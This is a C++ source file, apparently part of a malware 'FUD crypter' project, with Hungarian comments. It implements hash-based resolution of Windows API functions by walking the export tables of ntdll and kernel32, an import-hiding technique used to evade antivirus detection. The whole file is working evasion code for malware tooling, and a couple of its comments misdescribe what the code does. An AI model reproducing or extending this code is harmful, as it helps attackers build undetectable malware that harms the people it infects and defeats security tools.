#include "fud_crypter/api_resolver.hpp"
#include <winternl.h>

namespace fud_crypter {
    namespace api {

        // PEB-ből az export tábla bejárása
        static FARPROC resolve_from_module(HMODULE module, uint32_t hash) {
            if (!module) return nullptr;

            // DOS header
            auto dos = reinterpret_cast<IMAGE_DOS_HEADER*>(module);
            if (dos->e_magic != IMAGE_DOS_SIGNATURE) return nullptr;

            // NT header
            auto nt = reinterpret_cast<IMAGE_NT_HEADERS*>(
                reinterpret_cast<uint8_t*>(module) + dos->e_lfanew
            );
            if (nt->Signature != IMAGE_NT_SIGNATURE) return nullptr;

            // Export directory
            auto exp = &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            if (!exp->Size || !exp->VirtualAddress) return nullptr;

            auto exports = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(
                reinterpret_cast<uint8_t*>(module) + exp->VirtualAddress
            );

            auto names = reinterpret_cast<uint32_t*>(
                reinterpret_cast<uint8_t*>(module) + exports->AddressOfNames
            );
            auto functions = reinterpret_cast<uint32_t*>(
                reinterpret_cast<uint8_t*>(module) + exports->AddressOfFunctions
            );
            auto ordinals = reinterpret_cast<uint16_t*>(
                reinterpret_cast<uint8_t*>(module) + exports->AddressOfNameOrdinals
            );

            // Iteráció a névtáblán
            for (uint32_t i = 0; i < exports->NumberOfNames; ++i) {
                const char* name = reinterpret_cast<const char*>(
                    reinterpret_cast<uint8_t*>(module) + names[i]
                );
                if (ror13_hash(name) == hash) {
                    return reinterpret_cast<FARPROC>(
                        reinterpret_cast<uint8_t*>(module) + functions[ordinals[i]]
                    );
                }
            }
            return nullptr;
        }

        ApiResolver::ApiResolver() {
            // Psuedo-handle a saját folyamathoz
            h_ntdll_ = GetModuleHandleW(L"ntdll.dll");
            h_kernel32_ = GetModuleHandleW(L"kernel32.dll");
        }

        FARPROC ApiResolver::resolve(uint32_t hash) const {
            FARPROC result = resolve_from_module(h_ntdll_, hash);
            if (result) return result;
            return resolve_from_module(h_kernel32_, hash);
        }

    } // namespace api
} // namespace fud_crypter
